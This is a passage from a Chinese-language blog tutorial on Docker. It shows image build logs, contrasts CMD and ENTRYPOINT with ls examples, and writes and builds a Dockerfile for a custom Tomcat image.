class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> 11ea6ae34521</span></span><br><span class="line">Removing intermediate container 11ea6ae34521</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 718b6ad3e5ef</span></span><br><span class="line">Step 5/10 : RUN yum -y install vim</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> a0431f8c2a80</span></span><br><span class="line">CentOS Linux 8 - AppStream                      8.4 MB/s | 8.8 MB     00:01</span><br><span class="line">CentOS Linux 8 - BaseOS                         6.4 MB/s | 5.6 MB     00:00</span><br><span class="line">CentOS Linux 8 - Extras                          17 kB/s |  10 kB     00:00</span><br><span class="line">Dependencies resolved.</span><br><span class="line">================================================================================</span><br><span class="line"> Package             Arch        Version                   Repository      Size</span><br><span class="line">================================================================================</span><br><span class="line">Installing:</span><br><span class="line"> vim-enhanced        x86_64      2:8.0.1763-15.el8         appstream      1.4 M</span><br><span class="line">Installing dependencies:</span><br><span class="line"> gpm-libs            x86_64      1.20.7-17.el8             appstream       39 k</span><br><span class="line"> vim-common          x86_64      2:8.0.1763-15.el8         appstream      6.3 M</span><br><span class="line"> vim-filesystem      noarch      2:8.0.1763-15.el8         appstream       48 k</span><br><span class="line"> which               x86_64      2.21-12.el8               baseos          49 k</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">================================================================================</span><br><span class="line">Install  5 Packages</span><br><span class="line"></span><br><span class="line">Total download size: 7.8 M</span><br><span class="line">Installed size: 30 M</span><br><span class="line">Downloading Packages:</span><br><span class="line">(1/5): gpm-libs-1.20.7-17.el8.x86_64.rpm        342 kB/s |  39 kB     00:00</span><br><span class="line">(2/5): vim-filesystem-8.0.1763-15.el8.noarch.rp 842 kB/s |  48 kB     00:00</span><br><span class="line">(3/5): vim-enhanced-8.0.1763-15.el8.x86_64.rpm  5.0 MB/s | 1.4 MB     00:00</span><br><span class="line">(4/5): which-2.21-12.el8.x86_64.rpm             384 kB/s |  49 kB     00:00</span><br><span class="line">(5/5): vim-common-8.0.1763-15.el8.x86_64.rpm     15 MB/s | 6.3 MB     00:00</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">Total                                           5.8 MB/s | 7.8 MB     00:01</span><br><span class="line">warning: /var/cache/dnf/appstream-02e86d1c976ab532/packages/gpm-libs-1.20.7-17.el8.x86_64.rpm: Header V3 RSA/SHA256 Signature, key ID 8483c65d: NOKEY</span><br><span class="line">CentOS Linux 8 - AppStream                      1.6 MB/s | 1.6 kB     00:00</span><br><span class="line">Importing GPG key 0x8483C65D:</span><br><span class="line"> Userid     : &quot;CentOS (CentOS Official Signing Key) &lt;security@centos.org&gt;&quot;</span><br><span class="line"> Fingerprint: 99DB 70FA E1D7 CE22 7FB6 4882 05B5 55B3 8483 C65D</span><br><span class="line"> From       : /etc/pki/rpm-gpg/RPM-GPG-KEY-centosofficial</span><br><span class="line">Key imported successfully</span><br><span class="line">Running transaction check</span><br><span class="line">Transaction check succeeded.</span><br><span class="line">Running transaction test</span><br><span class="line">Transaction test succeeded.</span><br><span class="line">Running transaction</span><br><span class="line">  Preparing        :                                                        1/1</span><br><span class="line">  Installing       : which-2.21-12.el8.x86_64                               1/5</span><br><span class="line">  Installing       : vim-filesystem-2:8.0.1763-15.el8.noarch                2/5</span><br><span class="line">  Installing       : vim-common-2:8.0.1763-15.el8.x86_64                    3/5</span><br><span class="line">  Installing       : gpm-libs-1.20.7-17.el8.x86_64                          4/5</span><br><span class="line">  Running scriptlet: gpm-libs-1.20.7-17.el8.x86_64                          4/5</span><br><span class="line">  Installing       : vim-enhanced-2:8.0.1763-15.el8.x86_64                  5/5</span><br><span class="line">  Running scriptlet: vim-enhanced-2:8.0.1763-15.el8.x86_64                  5/5</span><br><span class="line">  Running scriptlet: vim-common-2:8.0.1763-15.el8.x86_64                    5/5</span><br><span class="line">  Verifying        : gpm-libs-1.20.7-17.el8.x86_64                          1/5</span><br><span class="line">  Verifying        : vim-common-2:8.0.1763-15.el8.x86_64                    2/5</span><br><span class="line">  Verifying        : vim-enhanced-2:8.0.1763-15.el8.x86_64                  3/5</span><br><span class="line">  Verifying        : vim-filesystem-2:8.0.1763-15.el8.noarch                4/5</span><br><span class="line">  Verifying        : which-2.21-12.el8.x86_64                               5/5</span><br><span class="line"></span><br><span class="line">Installed:</span><br><span class="line">  gpm-libs-1.20.7-17.el8.x86_64         vim-common-2:8.0.1763-15.el8.x86_64</span><br><span class="line">  vim-enhanced-2:8.0.1763-15.el8.x86_64 vim-filesystem-2:8.0.1763-15.el8.noarch</span><br><span class="line">  which-2.21-12.el8.x86_64</span><br><span class="line"></span><br><span class="line">Complete!</span><br><span class="line">Removing intermediate container a0431f8c2a80</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> b24fe1460a37</span></span><br><span class="line">Step 6/10 : RUN yum -y install net-tools</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> 8d93802f92ef</span></span><br><span class="line">Last metadata expiration check: 0:00:09 ago on Thu Sep  2 22:08:45 2021.</span><br><span class="line">Dependencies resolved.</span><br><span class="line">================================================================================</span><br><span class="line"> Package         Architecture Version                        Repository    Size</span><br><span class="line">================================================================================</span><br><span class="line">Installing:</span><br><span class="line"> net-tools       x86_64       2.0-0.52.20160912git.el8       baseos       322 k</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">================================================================================</span><br><span class="line">Install  1 Package</span><br><span class="line"></span><br><span class="line">Total download size: 322 k</span><br><span class="line">Installed size: 942 k</span><br><span class="line">Downloading Packages:</span><br><span class="line">net-tools-2.0-0.52.20160912git.el8.x86_64.rpm   1.5 MB/s | 322 kB     00:00</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">Total                                           496 kB/s | 322 kB     00:00</span><br><span class="line">Running transaction check</span><br><span class="line">Transaction check succeeded.</span><br><span class="line">Running transaction test</span><br><span class="line">Transaction test succeeded.</span><br><span class="line">Running transaction</span><br><span class="line">  Preparing        :                                                        1/1</span><br><span class="line">  Installing       : net-tools-2.0-0.52.20160912git.el8.x86_64              1/1</span><br><span class="line">  Running scriptlet: net-tools-2.0-0.52.20160912git.el8.x86_64              1/1</span><br><span class="line">  Verifying        : net-tools-2.0-0.52.20160912git.el8.x86_64              1/1</span><br><span class="line"></span><br><span class="line">Installed:</span><br><span class="line">  net-tools-2.0-0.52.20160912git.el8.x86_64</span><br><span class="line"></span><br><span class="line">Complete!</span><br><span class="line">Removing intermediate container 8d93802f92ef</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 21faf23714e9</span></span><br><span class="line">Step 7/10 : EXPOSE 80</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> 9330ed9b0c59</span></span><br><span class="line">Removing intermediate container 9330ed9b0c59</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 0979d2a554a2</span></span><br><span class="line">Step 8/10 : CMD echo $MYPATH</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> 44f2eb41253f</span></span><br><span class="line">Removing intermediate container 44f2eb41253f</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 77875e680c66</span></span><br><span class="line">Step 9/10 : CMD echo &quot;----end----&quot;</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> 0d852a5a41ba</span></span><br><span class="line">Removing intermediate container 0d852a5a41ba</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 6accda5d54d3</span></span><br><span class="line">Step 10/10 : CMD /bin/bash</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> ebce2e1a01ca</span></span><br><span class="line">Removing intermediate container ebce2e1a01ca</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> e49ddd3b677c</span></span><br><span class="line">Successfully built e49ddd3b677c</span><br><span class="line">Successfully tagged mycentos:0.1</span><br></pre></td></tr></table></figure>

<h2 id="3、测试运行"><a href="#3、测试运行" class="headerlink" title="3、测试运行"></a>3、测试运行</h2><p>&emsp;&emsp;原始centos</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630621203889-0e8e555a-74b9-40cb-9d8f-e8278b893cc4.png" alt="img"></p>
<p>&emsp;&emsp;<code>docker run -it  mycentos:0.1</code>，<code>docker run</code>命令如果指定了参数会把CMD里的参数覆盖。这里说明一下，如：<code>docker run -it mycentos:0.1 /bin/echo hello</code> 命令的参数是指<code>/bin/echo hello</code>而非<code>-it</code>，<code>-it</code>只是docker的参数，而不是容器的参数，因此如果使用此命令，会覆盖CMD的<code>/bin/bash</code>，输出hello。而这里没有指定参数，因此直接就进入了/bin/bash，而不需要像平时一样<code>docker run -it  mycentos:0.1 /bin/bash</code>多写一个<code>/bin/bash</code>。想要运行多个命令，可以使用ENTRYPOINT 指令 指定一个文件，文件中写多个指令即可。</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630622313448-12eb8601-61a0-44c9-b88f-f63653b463a8.png" alt="img"></p>
<p>&emsp;&emsp;新的centos</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630621296977-89dc3871-3765-4b51-be40-a3883414548e.png" alt="img"></p>
<p>&emsp;&emsp;另外，还可以通过<code>docker history 镜像ID/镜像名称</code>查看镜像的构造历史</p>
<p>&emsp;&emsp;<code>docker history mycentos:0.1</code>，可以看到，最终的centos镜像是一层一层叠加起来的，很符合这个理念图</p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630621408296-3ee42b9c-d88c-4b85-ad4d-3c59f602ba82.png" alt="img"></p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630378194134-f0a43a44-9cb2-42da-9175-edcc615c4fe6.png" alt="img"></p>
<h1 id="六、CMD和ENTRYPOINT区别"><a href="#六、CMD和ENTRYPOINT区别" class="headerlink" title="六、CMD和ENTRYPOINT区别"></a>六、CMD和ENTRYPOINT区别</h1><h2 id="1、CMD"><a href="#1、CMD" class="headerlink" title="1、CMD"></a>1、CMD</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">构建DockerFile文件</span></span><br><span class="line">[root@VM-0-15-centos dockerfile]# vim docker-file-cmd</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">Dockerfile内容</span></span><br><span class="line">FROM centos</span><br><span class="line">CMD [&quot;ls&quot;,&quot;-a&quot;]</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">构建镜像</span></span><br><span class="line">[root@VM-0-15-centos dockerfile]# docker build -f docker-file-cmd -t cmdtest .</span><br><span class="line">Sending build context to Docker daemon  3.072kB</span><br><span class="line">Step 1/2 : FROM centos</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 300e315adb2f</span></span><br><span class="line">Step 2/2 : CMD [&quot;ls&quot;,&quot;-a&quot;]</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> 9f3bac8d1665</span></span><br><span class="line">Removing intermediate container 9f3bac8d1665</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 23a0e7ffae6a</span></span><br><span class="line">Successfully built 23a0e7ffae6a</span><br><span class="line">Successfully tagged cmdtest:latest</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">启动容器，调用了ls -a</span></span><br><span class="line">[root@VM-0-15-centos dockerfile]# docker run cmdtest</span><br><span class="line">.</span><br><span class="line">..</span><br><span class="line">.dockerenv</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">lost+found</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">想着实现ls -a -l的效果，直接在后面加入-l，那么-l就覆盖了ls -a，因此失败了</span></span><br><span class="line">[root@VM-0-15-centos dockerfile]# docker run cmdtest -l</span><br><span class="line">docker: Error response from daemon: OCI runtime create failed: container_linux.go:380: starting container process caused: exec: &quot;-l&quot;: executable file not found in $PATH: unknown.</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">正确的方法实现ls -a -l的效果</span></span><br><span class="line">[root@VM-0-15-centos dockerfile]# docker run cmdtest ls -al</span><br><span class="line">total 56</span><br><span class="line">drwxr-xr-x   1 root root 4096 Sep  2 23:28 .</span><br><span class="line">drwxr-xr-x   1 root root 4096 Sep  2 23:28 ..</span><br><span class="line">-rwxr-xr-x   1 root root    0 Sep  2 23:28 .dockerenv</span><br><span class="line">lrwxrwxrwx   1 root root    7 Nov  3  2020 bin -&gt; usr/bin</span><br><span class="line">drwxr-xr-x   5 root root  340 Sep  2 23:28 dev</span><br><span class="line">drwxr-xr-x   1 root root 4096 Sep  2 23:28 etc</span><br><span class="line">drwxr-xr-x   2 root root 4096 Nov  3  2020 home</span><br><span class="line">lrwxrwxrwx   1 root root    7 Nov  3  2020 lib -&gt; usr/lib</span><br><span class="line">lrwxrwxrwx   1 root root    9 Nov  3  2020 lib64 -&gt; usr/lib64</span><br><span class="line">drwx------   2 root root 4096 Dec  4  2020 lost+found</span><br><span class="line">drwxr-xr-x   2 root root 4096 Nov  3  2020 media</span><br><span class="line">drwxr-xr-x   2 root root 4096 Nov  3  2020 mnt</span><br><span class="line">drwxr-xr-x   2 root root 4096 Nov  3  2020 opt</span><br><span class="line">dr-xr-xr-x 148 root root    0 Sep  2 23:28 proc</span><br><span class="line">dr-xr-x---   2 root root 4096 Dec  4  2020 root</span><br><span class="line">drwxr-xr-x  11 root root 4096 Dec  4  2020 run</span><br><span class="line">lrwxrwxrwx   1 root root    8 Nov  3  2020 sbin -&gt; usr/sbin</span><br><span class="line">drwxr-xr-x   2 root root 4096 Nov  3  2020 srv</span><br><span class="line">dr-xr-xr-x  13 root root    0 Sep  2 23:28 sys</span><br><span class="line">drwxrwxrwt   7 root root 4096 Dec  4  2020 tmp</span><br><span class="line">drwxr-xr-x  12 root root 4096 Dec  4  2020 usr</span><br><span class="line">drwxr-xr-x  20 root root 4096 Dec  4  2020 var</span><br><span class="line">[root@VM-0-15-centos dockerfile]#</span><br></pre></td></tr></table></figure>

<h2 id="2、ENTRYPOINT"><a href="#2、ENTRYPOINT" class="headerlink" title="2、ENTRYPOINT"></a>2、ENTRYPOINT</h2><figure class="highlight shell"><table><tr><td class="code"><pre><span class="line"><span class="meta">#</span><span class="bash">构建DockerFile文件</span></span><br><span class="line">[root@VM-0-15-centos dockerfile]# vim docker-file-entrypoint</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">Dockerfile内容</span></span><br><span class="line">FROM centos</span><br><span class="line">ENTRYPOINT [&quot;ls&quot;,&quot;-a&quot;]</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">构建镜像</span></span><br><span class="line">[root@VM-0-15-centos dockerfile]# docker build -f docker-file-entrypoint -t entrypointtest .</span><br><span class="line">Sending build context to Docker daemon  4.096kB</span><br><span class="line">Step 1/2 : FROM centos</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 300e315adb2f</span></span><br><span class="line">Step 2/2 : ENTRYPOINT [&quot;ls&quot;,&quot;-a&quot;]</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> df8bced1251d</span></span><br><span class="line">Removing intermediate container df8bced1251d</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 0691387ed2a7</span></span><br><span class="line">Successfully built 0691387ed2a7</span><br><span class="line">Successfully tagged entrypointtest:latest</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">启动容器，调用了ls -a</span></span><br><span class="line">[root@VM-0-15-centos dockerfile]# docker run entrypointtest</span><br><span class="line">.</span><br><span class="line">..</span><br><span class="line">.dockerenv</span><br><span class="line">bin</span><br><span class="line">dev</span><br><span class="line">etc</span><br><span class="line">home</span><br><span class="line">lib</span><br><span class="line">lib64</span><br><span class="line">lost+found</span><br><span class="line">media</span><br><span class="line">mnt</span><br><span class="line">opt</span><br><span class="line">proc</span><br><span class="line">root</span><br><span class="line">run</span><br><span class="line">sbin</span><br><span class="line">srv</span><br><span class="line">sys</span><br><span class="line">tmp</span><br><span class="line">usr</span><br><span class="line">var</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">想着实现ls -a -l的效果，直接在后面加入-l，那么ls -a就追加了-l，因此成功了</span></span><br><span class="line">[root@VM-0-15-centos dockerfile]# docker run entrypointtest -l</span><br><span class="line">total 56</span><br><span class="line">drwxr-xr-x   1 root root 4096 Sep  2 23:32 .</span><br><span class="line">drwxr-xr-x   1 root root 4096 Sep  2 23:32 ..</span><br><span class="line">-rwxr-xr-x   1 root root    0 Sep  2 23:32 .dockerenv</span><br><span class="line">lrwxrwxrwx   1 root root    7 Nov  3  2020 bin -&gt; usr/bin</span><br><span class="line">drwxr-xr-x   5 root root  340 Sep  2 23:32 dev</span><br><span class="line">drwxr-xr-x   1 root root 4096 Sep  2 23:32 etc</span><br><span class="line">drwxr-xr-x   2 root root 4096 Nov  3  2020 home</span><br><span class="line">lrwxrwxrwx   1 root root    7 Nov  3  2020 lib -&gt; usr/lib</span><br><span class="line">lrwxrwxrwx   1 root root    9 Nov  3  2020 lib64 -&gt; usr/lib64</span><br><span class="line">drwx------   2 root root 4096 Dec  4  2020 lost+found</span><br><span class="line">drwxr-xr-x   2 root root 4096 Nov  3  2020 media</span><br><span class="line">drwxr-xr-x   2 root root 4096 Nov  3  2020 mnt</span><br><span class="line">drwxr-xr-x   2 root root 4096 Nov  3  2020 opt</span><br><span class="line">dr-xr-xr-x 150 root root    0 Sep  2 23:32 proc</span><br><span class="line">dr-xr-x---   2 root root 4096 Dec  4  2020 root</span><br><span class="line">drwxr-xr-x  11 root root 4096 Dec  4  2020 run</span><br><span class="line">lrwxrwxrwx   1 root root    8 Nov  3  2020 sbin -&gt; usr/sbin</span><br><span class="line">drwxr-xr-x   2 root root 4096 Nov  3  2020 srv</span><br><span class="line">dr-xr-xr-x  13 root root    0 Sep  2 23:28 sys</span><br><span class="line">drwxrwxrwt   7 root root 4096 Dec  4  2020 tmp</span><br><span class="line">drwxr-xr-x  12 root root 4096 Dec  4  2020 usr</span><br><span class="line">drwxr-xr-x  20 root root 4096 Dec  4  2020 var</span><br><span class="line"><span class="meta"></span></span><br><span class="line"><span class="meta">#</span><span class="bash">ls -a追加ls -al变成了ls -a ls -al，因此失败</span></span><br><span class="line">[root@VM-0-15-centos dockerfile]# docker run entrypointtest ls -al</span><br><span class="line">ls: cannot access &#x27;ls&#x27;: No such file or directory</span><br></pre></td></tr></table></figure>

<h1 id="七、实战：Tomcat镜像"><a href="#七、实战：Tomcat镜像" class="headerlink" title="七、实战：Tomcat镜像"></a>七、实战：Tomcat镜像</h1><h2 id="1、文件准备"><a href="#1、文件准备" class="headerlink" title="1、文件准备"></a>1、文件准备</h2><p>&emsp;&emsp;准备镜像文件，tomcat压缩包（官网下载），jdk压缩包（官网下载），新建一个空的readme.txt文件</p>
<p>&emsp;&emsp;也可用我下载好的，百度网盘链接：<a href="https://pan.baidu.com/s/1QjtWSmtvss5fUUex5I_ISQ">https://pan.baidu.com/s/1QjtWSmtvss5fUUex5I_ISQ</a> 提取码：ccfj </p>
<p><img src="https://w01ke-1305929791.cos.ap-shanghai.myqcloud.com/img/1630773274941-affb2cf3-0252-4553-8130-f6da7aa7a922.png" alt="img"></p>
<h2 id="2、编写dockerfile文件"><a href="#2、编写dockerfile文件" class="headerlink" title="2、编写dockerfile文件"></a>2、编写dockerfile文件</h2><p>&emsp;&emsp;官方命名 <strong>Dockerfile ，build</strong>的时候会自动寻找这个文件，就不需要**-f**指定了</p>
<figure class="highlight dockerfile"><table><tr><td class="code"><pre><span class="line"><span class="keyword">FROM</span> centos</span><br><span class="line"><span class="keyword">MAINTAINER</span> xdd&lt;<span class="number">123456789</span>@qq.com&gt;</span><br><span class="line"></span><br><span class="line"><span class="keyword">COPY</span><span class="bash"> readme.txt /usr/<span class="built_in">local</span>/readme.txt</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> jdk-8u301-linux-x64.tar.gz /usr/<span class="built_in">local</span></span></span><br><span class="line"><span class="keyword">ADD</span><span class="bash"> apache-tomcat-10.0.10.tar.gz /usr/<span class="built_in">local</span></span></span><br><span class="line"></span><br><span class="line"><span class="keyword">RUN</span><span class="bash"> yum -y install vim</span></span><br><span class="line"></span><br><span class="line"><span class="keyword">ENV</span> MYPATH /usr/local</span><br><span class="line"><span class="keyword">WORKDIR</span><span class="bash"> <span class="variable">$MYPATH</span></span></span><br><span class="line"></span><br><span class="line"><span class="comment">#注意这个如果用的跟我一样必须是jdk1.8.0_301，不然后面会报错运行不起来tomcat，深刻教训</span></span><br><span class="line"><span class="comment">#错误示范：ENV JAVA_HOME /usr/local/jdk8u301 我想当然的就设置了个名字，结果是错的</span></span><br><span class="line"><span class="comment">#解压后的名字为jdk1.8.0_301，因此这里最好也设置jdk1.8.0_301</span></span><br><span class="line"><span class="keyword">ENV</span> JAVA_HOME /usr/local/jdk1.<span class="number">8.0</span>_301</span><br><span class="line"><span class="keyword">ENV</span> CLASSPATH $JAVA_HOME/lib/dt.jar:$JAVA_HOME/lib/tools.jar</span><br><span class="line"><span class="keyword">ENV</span> CATALINA_HOME /usr/local/apache-tomcat-<span class="number">10.0</span>.<span class="number">10</span></span><br><span class="line"><span class="keyword">ENV</span> CATALINA_BASH /usr/local/apache-tomcat-<span class="number">10.0</span>.<span class="number">10</span></span><br><span class="line"><span class="keyword">ENV</span> PATH $PATH:$JAVA_HOME/bin:$CATALINA_HOME/lib:$CATALINA_HOME/bin</span><br><span class="line"></span><br><span class="line"><span class="keyword">EXPOSE</span> <span class="number">8080</span></span><br><span class="line"></span><br><span class="line"><span class="comment">#tail -F:等同于--follow=name  --retry，根据文件名进行追踪，并保持重试，即该文件被删除或改名后，如果再次创建相同的文件名，会继续追踪</span></span><br><span class="line"><span class="keyword">CMD</span><span class="bash"> /usr/<span class="built_in">local</span>/apache-tomcat-10.0.10/bin/startup.sh &amp;&amp; tail -F /usr/<span class="built_in">local</span>/apache-tomcat-10.0.10/logs/catalina.out</span></span><br></pre></td></tr></table></figure>

<h2 id="3、构建镜像"><a href="#3、构建镜像" class="headerlink" title="3、构建镜像"></a>3、构建镜像</h2><p>&emsp;&emsp;<code>docker build -t diytomcat .</code></p>
<figure class="highlight shell"><table><tr><td class="code"><pre><span class="line">[root@VM-0-15-centos tomcat]# docker build -t diytomcat .</span><br><span class="line">Sending build context to Docker daemon  157.4MB</span><br><span class="line">Step 1/15 : FROM centos</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 300e315adb2f</span></span><br><span class="line">Step 2/15 : MAINTAINER xdd&lt;123456789@qq.com&gt;</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> d3da61a8177a</span></span><br><span class="line">Removing intermediate container d3da61a8177a</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 9e1df92badf0</span></span><br><span class="line">Step 3/15 : COPY readme.txt /usr/local/readme.txt</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 22fc0081ce2d</span></span><br><span class="line">Step 4/15 : ADD jdk-8u301-linux-x64.tar.gz /usr/local</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> f4ec24113686</span></span><br><span class="line">Step 5/15 : ADD apache-tomcat-10.0.10.tar.gz /usr/local</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> a1b470e2bd7d</span></span><br><span class="line">Step 6/15 : RUN yum -y install vim</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> 614daf07d5b9</span></span><br><span class="line">CentOS Linux 8 - AppStream                      9.0 MB/s | 8.8 MB     00:00</span><br><span class="line">CentOS Linux 8 - BaseOS                         8.2 MB/s | 5.6 MB     00:00</span><br><span class="line">CentOS Linux 8 - Extras                          11 kB/s |  10 kB     00:00</span><br><span class="line">Last metadata expiration check: 0:00:01 ago on Sat Sep  4 16:37:32 2021.</span><br><span class="line">Dependencies resolved.</span><br><span class="line">================================================================================</span><br><span class="line"> Package             Arch        Version                   Repository      Size</span><br><span class="line">================================================================================</span><br><span class="line">Installing:</span><br><span class="line"> vim-enhanced        x86_64      2:8.0.1763-15.el8         appstream      1.4 M</span><br><span class="line">Installing dependencies:</span><br><span class="line"> gpm-libs            x86_64      1.20.7-17.el8             appstream       39 k</span><br><span class="line"> vim-common          x86_64      2:8.0.1763-15.el8         appstream      6.3 M</span><br><span class="line"> vim-filesystem      noarch      2:8.0.1763-15.el8         appstream       48 k</span><br><span class="line"> which               x86_64      2.21-12.el8               baseos          49 k</span><br><span class="line"></span><br><span class="line">Transaction Summary</span><br><span class="line">================================================================================</span><br><span class="line">Install  5 Packages</span><br><span class="line"></span><br><span class="line">Total download size: 7.8 M</span><br><span class="line">Installed size: 30 M</span><br><span class="line">Downloading Packages:</span><br><span class="line">(1/5): gpm-libs-1.20.7-17.el8.x86_64.rpm        328 kB/s |  39 kB     00:00</span><br><span class="line">(2/5): vim-filesystem-8.0.1763-15.el8.noarch.rp 824 kB/s |  48 kB     00:00</span><br><span class="line">(3/5): which-2.21-12.el8.x86_64.rpm             876 kB/s |  49 kB     00:00</span><br><span class="line">(4/5): vim-enhanced-8.0.1763-15.el8.x86_64.rpm  4.9 MB/s | 1.4 MB     00:00</span><br><span class="line">(5/5): vim-common-8.0.1763-15.el8.x86_64.rpm     16 MB/s | 6.3 MB     00:00</span><br><span class="line">--------------------------------------------------------------------------------</span><br><span class="line">Total                                           3.1 MB/s | 7.8 MB     00:02</span><br><span class="line">warning: /var/cache/dnf/appstream-02e86d1c976ab532/packages/gpm-libs-1.20.7-17.el8.x86_64.rpm: Header V3 RSA/SHA256 Signature, key ID 8483c65d: NOKEY</span><br><span class="line">CentOS Linux 8 - AppStream                      1.6 MB/s | 1.6 kB     00:00</span><br><span class="line">Importing GPG key 0x8483C65D:</span><br><span class="line"> Userid     : &quot;CentOS (CentOS Official Signing Key) &lt;security@centos.org&gt;&quot;</span><br><span class="line"> Fingerprint: 99DB 70FA E1D7 CE22 7FB6 4882 05B5 55B3 8483 C65D</span><br><span class="line"> From       : /etc/pki/rpm-gpg/RPM-GPG-KEY-centosofficial</span><br><span class="line">Key imported successfully</span><br><span class="line">Running transaction check</span><br><span class="line">Transaction check succeeded.</span><br><span class="line">Running transaction test</span><br><span class="line">Transaction test succeeded.</span><br><span class="line">Running transaction</span><br><span class="line">  Preparing        :                                                        1/1</span><br><span class="line">  Installing       : which-2.21-12.el8.x86_64                               1/5</span><br><span class="line">  Installing       : vim-filesystem-2:8.0.1763-15.el8.noarch                2/5</span><br><span class="line">  Installing       : vim-common-2:8.0.1763-15.el8.x86_64                    3/5</span><br><span class="line">  Installing       : gpm-libs-1.20.7-17.el8.x86_64                          4/5</span><br><span class="line">  Running scriptlet: gpm-libs-1.20.7-17.el8.x86_64                          4/5</span><br><span class="line">  Installing       : vim-enhanced-2:8.0.1763-15.el8.x86_64                  5/5</span><br><span class="line">  Running scriptlet: vim-enhanced-2:8.0.1763-15.el8.x86_64                  5/5</span><br><span class="line">  Running scriptlet: vim-common-2:8.0.1763-15.el8.x86_64                    5/5</span><br><span class="line">  Verifying        : gpm-libs-1.20.7-17.el8.x86_64                          1/5</span><br><span class="line">  Verifying        : vim-common-2:8.0.1763-15.el8.x86_64                    2/5</span><br><span class="line">  Verifying        : vim-enhanced-2:8.0.1763-15.el8.x86_64                  3/5</span><br><span class="line">  Verifying        : vim-filesystem-2:8.0.1763-15.el8.noarch                4/5</span><br><span class="line">  Verifying        : which-2.21-12.el8.x86_64                               5/5</span><br><span class="line"></span><br><span class="line">Installed:</span><br><span class="line">  gpm-libs-1.20.7-17.el8.x86_64         vim-common-2:8.0.1763-15.el8.x86_64</span><br><span class="line">  vim-enhanced-2:8.0.1763-15.el8.x86_64 vim-filesystem-2:8.0.1763-15.el8.noarch</span><br><span class="line">  which-2.21-12.el8.x86_64</span><br><span class="line"></span><br><span class="line">Complete!</span><br><span class="line">Removing intermediate container 614daf07d5b9</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 05882b638556</span></span><br><span class="line">Step 7/15 : ENV MYPATH /usr/local</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> 6f9ed4aba243</span></span><br><span class="line">Removing intermediate container 6f9ed4aba243</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 73f831aacc97</span></span><br><span class="line">Step 8/15 : WORKDIR $MYPATH</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> Running <span class="keyword">in</span> 061a96c81eab</span></span><br><span class="line">Removing intermediate container 061a96c81eab</span><br><span class="line"><span class="meta"> ---&gt;</span><span class="bash"> 979f862d9edc</span></span><br><span class="line">Step 9/15 : ENV JAVA_HOME 